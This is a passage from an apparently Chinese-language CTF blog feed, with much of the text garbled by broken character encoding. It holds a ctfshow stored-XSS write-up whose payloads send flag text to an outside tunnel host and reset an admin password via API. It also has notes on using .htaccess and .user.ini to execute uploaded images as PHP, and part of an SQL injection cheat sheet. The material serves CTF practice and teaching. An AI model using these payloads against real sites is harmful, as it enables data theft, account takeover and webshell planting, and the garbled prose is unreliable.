ÊòØÂåÖÂê´‚Äúctfshow{‚ÄùÊñáÊú¨ÁöÑÂÖÉÁ¥†ÁöÑÊñáÊú¨ÂÜÖÂÆπ„ÄÇËØ∑Ê≥®ÊÑèÔºåËØ•‰ª£Á†ÅÂèØËÉΩ‰ºöÂØπÁî®Êà∑ÁöÑËÆ°ÁÆóÊú∫ÊàñÁΩëÁªúÈÄ†ÊàêÊΩúÂú®ÁöÑÂÆâÂÖ®È£éÈô©ÔºåÂ∫î‰ªÖÂú®ÂÆâÂÖ®ÁéØÂ¢É‰∏≠ËøêË°å„ÄÇ</p></blockquote><p>Ê≥®ÂÜå‰∏Ä‰∏™Êñ∞Áî®Êà∑ ÂØÜÁ†ÅÂ°´ÂÖ•payload<br><code>&lt;script&gt; $(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;     if(value.innerText.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)     &#123;location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+value.innerText&#125; &#125;); &lt;/script&gt;</code><br>‰∏ÄÊÆµÊó∂ÂÄôÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f5598608d95847fb9ae9c8d93ed5c14e.png" alt="2"></p><h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>Êú¨È¢òÂ§ö‰∫Ü‰∏Ä‰∏™‰øÆÊîπÂØÜÁ†ÅÁöÑÈÄâÈ°πÔºåÊäìÂåÖÁúãÁúã„ÄÇÂ≠òÂú®‰∏Ä‰∏™apiÊé•Âè£„ÄÇ<br><img src="https://img-blog.csdnimg.cn/466be17549174dadbe636ff9ea1c7206.png" alt="1"><br>Êàë‰ª¨ÂèØ‰ª•ÂÜçÂàõÂª∫‰∏Ä‰∏™Áî®Êà∑Ôºåuser‰∏∫payload‰πüÂ∞±ÊòØ<code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=asdd&#39;&lt;/script&gt;</code><br>ËøôÊó∂ÂΩìÊàë‰ª¨ÁôªÈôÜÊó∂Â∞±ÊòØÁÆ°ÁêÜÂëòË∫´‰ªΩ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/7dab5e3fba604f1494dc8156c0c6ebca.png" alt="2"></p><h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>ÊäìÂåÖÂèëÁé∞Ë¶Å‰ΩøÁî®postËØ∑Ê±ÇÔºå‰∏çÂ§™ÊáÇjs„ÄÇÁΩë‰∏äÊêú‰∏Ä‰∏ã‰ΩøÁî®jsÂèëÈÄÅhttpËØ∑Ê±Ç„ÄÇ<br>Êé®Ëçê‰∏Ä‰∏™ÊñπÊ≥ïÔºö</p><h4 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest()"></a>XMLHttpRequest()</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Á¨¨‰∏ÄÊ≠•ÔºöÂàõÂª∫ÈúÄË¶ÅÁöÑÂØπË±°</span>httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Á¨¨‰∫åÊ≠•ÔºöÊâìÂºÄËøûÊé•</span>httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËÆæÁΩÆËØ∑Ê±ÇÂ§¥ Ê≥®ÔºöpostÊñπÂºèÂøÖÈ°ªËÆæÁΩÆËØ∑Ê±ÇÂ§¥ÔºàÂú®Âª∫Á´ãËøûÊé•ÂêéËÆæÁΩÆËØ∑Ê±ÇÂ§¥Ôºâ</span>httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'name=teswe&amp;ee=ef'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÂèëÈÄÅËØ∑Ê±Ç Â∞ÜÊÉÖÂ§¥‰ΩìÂÜôÂú®send‰∏≠</span><span class="token comment">/** * Ëé∑ÂèñÊï∞ÊçÆÂêéÁöÑÂ§ÑÁêÜÁ®ãÂ∫è */</span>httpRequest<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//ËØ∑Ê±ÇÂêéÁöÑÂõûË∞ÉÊé•Âè£ÔºåÂèØÂ∞ÜËØ∑Ê±ÇÊàêÂäüÂêéË¶ÅÊâßË°åÁöÑÁ®ãÂ∫èÂÜôÂú®ÂÖ∂‰∏≠</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>httpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> httpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//È™åËØÅËØ∑Ê±ÇÊòØÂê¶ÂèëÈÄÅÊàêÂäü</span>        <span class="token keyword">var</span> json <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token comment">//Ëé∑ÂèñÂà∞ÊúçÂä°Á´ØËøîÂõûÁöÑÊï∞ÊçÆ</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê≥®ÂÜåuser ÂíåpasswordÁöÑpayloadÔºåËÆøÈóÆÁî®Êà∑ÁÆ°ÁêÜÈ°µÈù¢Âç≥ÂèØÂæóÂà∞flag„ÄÇ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/api/change.php'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'p=1234567'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/8ab67c81294a4c38ba416d389eb32f4d.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.htaccess Âíå.user.ini</title>
      <link href="/2023/02/21/htaccess-%E5%92%8C-user-ini/"/>
      <url>/2023/02/21/htaccess-%E5%92%8C-user-ini/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>httpd-conf ÊòØ Apache ÁöÑÁ≥ªÁªüÈÖçÁΩÆÊñá‰ª∂Ôºå‰∏Ä‰∏™ÂÖ®Â±ÄÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÂØπÊï¥‰∏™ web ÊúçÂä°Ëµ∑‰ΩúÁî®ÔºõËÄå.htaccess ‰πüÊòØ Apache ÁöÑÈÖçÁΩÆÊñá‰ª∂Ôºå‰∏çËøáÁõ∏ÂΩì‰∫é‰∏Ä‰∏™Â±ÄÈÉ®ÈÖçÁΩÆÊñá‰ª∂ÔºåÂè™ÂØπËØ•Êñá‰ª∂ÊâÄÂú®ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂Ëµ∑‰ΩúÁî®„ÄÇ</p><h4 id="ÂÆû‰æã"><a href="#ÂÆû‰æã" class="headerlink" title="ÂÆû‰æã"></a>ÂÆû‰æã</h4><p>Âú®ÁªïËøáÊñá‰ª∂‰∏ä‰º†ÁöÑÈôêÂà∂‰∏≠ÔºåÈÄöÂ∏∏Âú® Apache ÂÖ®Â±ÄÈÖçÁΩÆÊñá‰ª∂ httpd.conf ‰∏≠ÊúâËøôÊ†∑‰∏ÄÊù°ÈÖçÁΩÆÔºö</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ËøôÊù°ÈÖçÁΩÆÁöÑÊÑèÊÄùÂ∞±ÊòØÂ∞Ü.php„ÄÅ.phtml Êñá‰ª∂ÂêéÁºÄÁöÑÊñá‰ª∂ÂΩìÂÅö php Êñá‰ª∂ÊâßË°åÔºåÂ¶ÇÊûúÂºÄÂêØ‰∫ÜËøôÊù°ÈÖçÁΩÆÔºåÂ∞±ÂèØ‰ª•‰∏ä‰º†.phtml Êñá‰ª∂Âú®ÊâßË°å  php ‰ª£Á†ÅÔºåËøô‰πüÂ∞±ÊòØ‰∏∫‰ªÄ‰πàÂú®Êñá‰ª∂‰∏ä‰º†Êó∂ÂèØ‰ª•Â∞ùËØï‰∏ä‰º†.phtmlÔºå‰∏çËøáÂú®È´òÁâàÊú¨‰∏≠ËøôÊù°ÈÖçÁΩÆÈªòËÆ§ÊòØÂÖ≥Èó≠ÁöÑÔºå‰πüÂ∞±ÊòØÂè™ËÉΩËß£Êûê.php Êñá‰ª∂ÂêéÁºÄ„ÄÇ  </p><p>ÊàñËÄÖËøôÊù°ÈÖçÁΩÆÔºö</p><pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Â∞ÜÊâÄÊúâÊñá‰ª∂ÈÉΩËß£Êûê‰∏∫ php Êñá‰ª∂„ÄÇ  </p><p>ÈÄöÂ∏∏ÂÖ®Â±ÄÊñá‰ª∂Êàë‰ª¨ÈÉΩÊòØ‰∏çÂèØÊõ¥ÊîπÁöÑÔºåËÄå Apache ËøòÊúâ‰∏Ä‰∏™Â±ÄÈÉ®ÈÖçÁΩÆÊñá‰ª∂.htaccessÔºåËøô‰∏™ÈÖçÁΩÆÊñá‰ª∂Âè™ÂØπËØ•ÁõÆÂΩïÊâÄÂú®ÁöÑ web ÁõÆÂΩïËµ∑‰ΩúÁî®Ôºå‰æãÂ¶ÇÔºöÊàë‰ª¨Âú® www ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™.htaccess ÈÖçÁΩÆÊñá‰ª∂ÔºåÈÖçÁΩÆÂÜÖÂÆπ‰∏∫ <code>AddType application/x-httpd-php .jpg</code> ÔºåÂ∞Ü jpg Êñá‰ª∂ÂΩìÂÅö PHP Êñá‰ª∂Ëß£Êûê„ÄÇËøôÊ†∑Â∞±ÂèØ‰ª•Áõ¥Êé•Ëß£Êûê jpg ÂêéÁºÄÁöÑ webshell„ÄÇ</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .htaccessAddType application&#x2F;x-httpd-php .jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ËÆøÈóÆ 1.jpgÔºåÂΩìÂÅö PHP Ëß£Êûê„ÄÇ  </p><h4 id="Â±ÄÈôê"><a href="#Â±ÄÈôê" class="headerlink" title="Â±ÄÈôê"></a>Â±ÄÈôê</h4><p>.htaccess ÈÖçÁΩÆÊñá‰ª∂Âè™Âú® Apache ÊúçÂä°Âô®‰∏≠Ëµ∑‰ΩúÁî®„ÄÇ  </p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>php.ini ÊòØ php ÁöÑ‰∏Ä‰∏™ÂÖ®Â±ÄÈÖçÁΩÆÊñá‰ª∂ÔºåÂØπÊï¥‰∏™ web ÊúçÂä°Ëµ∑‰ΩúÁî®ÔºõËÄå.user.ini Âíå.htaccess ‰∏ÄÊ†∑ÊòØÁõÆÂΩïÁöÑÈÖçÁΩÆÊñá‰ª∂Ôºå.user.ini Â∞±ÊòØÁî®Êà∑Ëá™ÂÆö‰πâÁöÑ‰∏Ä‰∏™ php.iniÔºåÈÄöÂ∏∏Áî®Ëøô‰∏™Êñá‰ª∂Êù•ÊûÑÈÄ†ÂêéÈó®ÂíåÈöêËóèÂêéÈó®„ÄÇ</p><h4 id="ÂÆû‰æã-1"><a href="#ÂÆû‰æã-1" class="headerlink" title="ÂÆû‰æã"></a>ÂÆû‰æã</h4><p>php ÈÖçÁΩÆÈ°π‰∏≠Êúâ‰∏§‰∏™ÈÖçÁΩÆÂèØ‰ª•Ëµ∑Âà∞‰∏Ä‰∫õ‰ΩúÁî®</p><pre class="line-numbers language-none"><code class="language-none">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;ÂåÖÂê´Âú®Êñá‰ª∂Â§¥auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;ÂåÖÂê´Âú®Êñá‰ª∂Â∞æ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Ëøô‰∏§‰∏™ÈÖçÁΩÆÈ°πÁöÑ‰ΩúÁî®Áõ∏ÂΩì‰∫é‰∏Ä‰∏™Êñá‰ª∂ÂåÖÂê´ÔºåÊØîÂ¶Ç</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .user.iniauto_prepend_file &#x3D; 1.jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;&#x2F;&#x2F; 11.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>‰πüÂ∞±ÊòØÂú®‰∏Ä‰∏™ÁõÆÂΩï‰∏ãÊúâ.user.ini Ëøô‰∏™ÈÖçÁΩÆÊñá‰ª∂ÔºåÈÖçÁΩÆÂÜÖÂÆπ‰∏∫‰∏äÔºåÊúâ 1.jpgÔºåÂêåÊó∂ËØ•ÁõÆÂΩï‰∏ãËøòÈúÄË¶ÅÊúâ.php ÂêéÁºÄÁöÑÊñá‰ª∂Ôºå<code>auto_prepend_file = 1.jpg</code> Ëøô‰∏™ÈÖçÁΩÆÁöÑÊÑèÊÄùÂ∞±ÊòØÂú®ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑ.php Êñá‰ª∂ÂåÖÂê´ 1.jpg Ëøô‰∏™ÂõæÁâáÔºåÂú®Ê≠§Â§ÑÁõ∏ÂΩì‰∫éÂú® 11.php Êñá‰ª∂Â§¥ÊèíÂÖ•‰∫Ü <code>require(&#39;1.jpg&#39;)</code> ËøôÊù°ËØ≠Âè•Ôºå‰πüÂ∞±ÊòØËØ¥Áõ∏ÂΩì‰∫éÊñá‰ª∂ÂåÖÂê´„ÄÇ<br>Âè¶‰∏ÄÊù°ÈÖçÁΩÆÂåÖÂê´Âú®Êñá‰ª∂Â∞æÔºåÂ¶ÇÊûúÈÅáÂà∞‰∫Ü exit ËØ≠Âè•ÁöÑËØùÂ∞±‰ºöÂ§±Êïà„ÄÇ</p><p>.user.ini ‰ΩøÁî®ËåÉÂõ¥ÂæàÂπøÔºå‰∏ç‰ªÖÈôê‰∫é Apache ÊúçÂä°Âô®ÔºåÂêåÊ†∑ÈÄÇÁî®‰∫é Nginx ÊúçÂä°Âô®ÔºåÂè™Ë¶ÅÊúçÂä°Âô®ÂêØÁî®‰∫Ü fastcgi Ê®°Âºè (ÈÄöÂ∏∏ÈùûÁ∫øÁ®ãÂÆâÂÖ®Ê®°Âºè‰ΩøÁî®ÁöÑÂ∞±ÊòØ fastcgi Ê®°Âºè)„ÄÇ  </p><h4 id="Â±ÄÈôê-1"><a href="#Â±ÄÈôê-1" class="headerlink" title="Â±ÄÈôê"></a>Â±ÄÈôê</h4><p>Âú®.user.ini ‰∏≠‰ΩøÁî®ËøôÊù°ÈÖçÁΩÆÁöÑ‰ΩøÁî®‰πüËØ¥‰∫ÜÊòØÂú®ÂêåÁõÆÂΩï‰∏ãÁöÑÂÖ∂‰ªñ.php Êñá‰ª∂‰∏≠ÂåÖÂê´ÈÖçÁΩÆ‰∏≠ÊâÄÊåáÂÆöÁöÑÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØËØ¥ÈúÄË¶ÅËØ•ÁõÆÂΩï‰∏ãÂ≠òÂú®.php Êñá‰ª∂ÔºåÈÄöÂ∏∏Âú®Êñá‰ª∂‰∏ä‰º†‰∏≠Ôºå‰∏ÄËà¨ÊòØ‰∏ìÈó®Êúâ‰∏Ä‰∏™ÁõÆÂΩïÁî®Êù•Â≠òÂú®ÂõæÁâáÔºåÂèØËÉΩÂ∞èÊ¶ÇÁéá‰ºöÂ≠òÂú®.php Êñá‰ª∂„ÄÇ  </p><p>‰ΩÜÊòØÊúâÊó∂ÂèØ‰ª•‰ΩøÁî® <code>../</code> Êù•Â∞ÜÊñá‰ª∂‰∏ä‰º†Âà∞ÂÖ∂‰ªñÁõÆÂΩïÔºåËææÂà∞‰∏Ä‰∏™Âà©Áî®ÁöÑÊïàÊûú„ÄÇ  </p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labsÈ¢òÁõÆËß£Êûê</title>
      <link href="/2023/02/20/upload-labs%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/02/20/upload-labs%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> uploadfile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLÊ≥®ÂÖ•ÈÄüÊü•Ë°®</title>
      <link href="/2023/01/18/SQL%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2023/01/18/SQL%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="SQL-Ê≥®ÂÖ•ÈÄüÊü•Ë°®"><a href="#SQL-Ê≥®ÂÖ•ÈÄüÊü•Ë°®" class="headerlink" title="SQL Ê≥®ÂÖ•ÈÄüÊü•Ë°®"></a>SQL Ê≥®ÂÖ•ÈÄüÊü•Ë°®</h1><p>Ê≠§<a href="https://portswigger.net/web-security/sql-injection">SQL Ê≥®ÂÖ•</a>ÈÄüÊü•Ë°®ÂåÖÂê´ÊúâÁî®ËØ≠Ê≥ïÁöÑÁ§∫‰æãÔºåÊÇ®ÂèØ‰ª•‰ΩøÁî®Ëøô‰∫õÁ§∫‰æãÊù•ÊâßË°åÊâßË°å SQL Ê≥®ÂÖ•ÊîªÂáªÊó∂ÁªèÂ∏∏Âá∫Áé∞ÁöÑÂêÑÁßç‰ªªÂä°„ÄÇ</p><h2 id="Â≠óÁ¨¶‰∏≤ËøûÊé•"><a href="#Â≠óÁ¨¶‰∏≤ËøûÊé•" class="headerlink" title="Â≠óÁ¨¶‰∏≤ËøûÊé•"></a>Â≠óÁ¨¶‰∏≤ËøûÊé•</h2><p>ÊÇ®ÂèØ‰ª•Â∞ÜÂ§ö‰∏™Â≠óÁ¨¶‰∏≤ËøûÊé•Âú®‰∏ÄËµ∑‰ª•ÂΩ¢Êàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇ</p><p>| Áî≤È™®Êñá | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| :‚Äî‚Äì | ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî |<br>| ÂæÆËΩØ   | <code>&#39;foo&#39;+&#39;bar&#39;</code>                                                |<br>| Êï∞ÊçÆÂ∫ì | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| MySQL  | <code>&#39;foo&#39; &#39;bar&#39;</code>[Ê≥®ÊÑè‰∏§‰∏™Â≠óÁ¨¶‰∏≤‰πãÈó¥ÁöÑÁ©∫Ê†º] <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code> |</p><h2 id="Â≠ê‰∏≤"><a href="#Â≠ê‰∏≤" class="headerlink" title="Â≠ê‰∏≤"></a>Â≠ê‰∏≤</h2><p>ÊÇ®ÂèØ‰ª•‰ªéÂÖ∑ÊúâÊåáÂÆöÈïøÂ∫¶ÁöÑÊåáÂÆöÂÅèÁßªÈáè‰∏≠ÊèêÂèñÂ≠óÁ¨¶‰∏≤ÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇËØ∑Ê≥®ÊÑèÔºåÂÅèÁßªÁ¥¢ÂºïÊòØ‰ªé 1 ÂºÄÂßãÁöÑ„ÄÇ‰ª•‰∏ãÊØè‰∏™Ë°®ËææÂºèÈÉΩÂ∞ÜËøîÂõûÂ≠óÁ¨¶‰∏≤<code>ba</code>„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>SUBSTR(&#39;foobar&#39;, 4, 2)</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td></tr><tr><td align="left">MySQL</td><td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td></tr></tbody></table><h2 id="Ê≥®Èáä"><a href="#Ê≥®Èáä" class="headerlink" title="Ê≥®Èáä"></a>Ê≥®Èáä</h2><p>ÊÇ®ÂèØ‰ª•‰ΩøÁî®Ê≥®ÈáäÊù•Êà™Êñ≠Êü•ËØ¢Âπ∂Âà†Èô§ËæìÂÖ•ÂêéÁöÑÂéüÂßãÊü•ËØ¢ÈÉ®ÂàÜ„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>--comment</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>--comment/*comment*/</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>--comment/*comment*/</code></td></tr><tr><td align="left">MySQL</td><td><code>#comment</code> <code>-- comment</code>[Ê≥®ÊÑèÂèåÁ†¥ÊäòÂè∑ÂêéÁöÑÁ©∫Ê†º] <code>/*comment*/</code></td></tr></tbody></table><h2 id="Êï∞ÊçÆÂ∫ìÁâàÊú¨"><a href="#Êï∞ÊçÆÂ∫ìÁâàÊú¨" class="headerlink" title="Êï∞ÊçÆÂ∫ìÁâàÊú¨"></a>Êï∞ÊçÆÂ∫ìÁâàÊú¨</h2><p>ÊÇ®ÂèØ‰ª•Êü•ËØ¢Êï∞ÊçÆÂ∫ì‰ª•Á°ÆÂÆöÂÖ∂Á±ªÂûãÂíåÁâàÊú¨„ÄÇÂú®Âà∂ÂÆöÊõ¥Â§çÊùÇÁöÑÊîªÂáªÊó∂ÔºåÊ≠§‰ø°ÊÅØÂæàÊúâÁî®„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>SELECT banner FROM v$versionSELECT version FROM v$instance</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>SELECT @@version</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>SELECT version()</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT @@version</code></td></tr></tbody></table><h2 id="Êï∞ÊçÆÂ∫ìÂÜÖÂÆπ"><a href="#Êï∞ÊçÆÂ∫ìÂÜÖÂÆπ" class="headerlink" title="Êï∞ÊçÆÂ∫ìÂÜÖÂÆπ"></a>Êï∞ÊçÆÂ∫ìÂÜÖÂÆπ</h2><p>ÊÇ®ÂèØ‰ª•ÂàóÂá∫Êï∞ÊçÆÂ∫ì‰∏≠Â≠òÂú®ÁöÑË°®Ôºå‰ª•ÂèäËøô‰∫õË°®ÂåÖÂê´ÁöÑÂàó„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr></tbody></table><h2 id="Êù°‰ª∂ÈîôËØØ"><a href="#Êù°‰ª∂ÈîôËØØ" class="headerlink" title="Êù°‰ª∂ÈîôËØØ"></a>Êù°‰ª∂ÈîôËØØ</h2><p>ÊÇ®ÂèØ‰ª•ÊµãËØïÂçï‰∏™Â∏ÉÂ∞îÊù°‰ª∂Âπ∂Âú®Êù°‰ª∂‰∏∫ÁúüÊó∂Ëß¶ÂèëÊï∞ÊçÆÂ∫ìÈîôËØØ„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td></tr></tbody></table><h2 id="ÊâπÈáèÔºàÊàñÂ†ÜÂè†ÔºâÊü•ËØ¢"><a href="#ÊâπÈáèÔºàÊàñÂ†ÜÂè†ÔºâÊü•ËØ¢" class="headerlink" title="ÊâπÈáèÔºàÊàñÂ†ÜÂè†ÔºâÊü•ËØ¢"></a>ÊâπÈáèÔºàÊàñÂ†ÜÂè†ÔºâÊü•ËØ¢</h2><p>ÊÇ®ÂèØ‰ª•‰ΩøÁî®ÊâπÂ§ÑÁêÜÊü•ËØ¢Êù•ËøûÁª≠ÊâßË°åÂ§ö‰∏™Êü•ËØ¢„ÄÇËØ∑Ê≥®ÊÑèÔºåÂú®ÊâßË°åÂêéÁª≠Êü•ËØ¢Êó∂Ôºå‰∏ç‰ºöÂ∞ÜÁªìÊûúËøîÂõûÁªôÂ∫îÁî®Á®ãÂ∫è„ÄÇÂõ†Ê≠§ÔºåËØ•ÊäÄÊúØ‰∏ªË¶ÅÁî®‰∫éËß£ÂÜ≥Áõ≤ÊºèÊ¥ûÔºåÊÇ®ÂèØ‰ª•‰ΩøÁî®Á¨¨‰∫å‰∏™Êü•ËØ¢Êù•Ëß¶Âèë DNS Êü•Êâæ„ÄÅÊù°‰ª∂ÈîôËØØÊàñÊó∂Èó¥Âª∂Ëøü„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>Does not support batched queries.</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><td align="left">MySQL</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr></tbody></table><h4 id="Á¨îËÆ∞"><a href="#Á¨îËÆ∞" class="headerlink" title="Á¨îËÆ∞"></a>Á¨îËÆ∞</h4><p>ÂØπ‰∫é MySQLÔºåÊâπÂ§ÑÁêÜÊü•ËØ¢ÈÄöÂ∏∏‰∏çËÉΩÁî®‰∫é SQL Ê≥®ÂÖ•„ÄÇ‰ΩÜÊòØÔºåÂ¶ÇÊûúÁõÆÊ†áÂ∫îÁî®Á®ãÂ∫è‰ΩøÁî®Êüê‰∫õ PHP Êàñ Python API ‰∏é MySQL 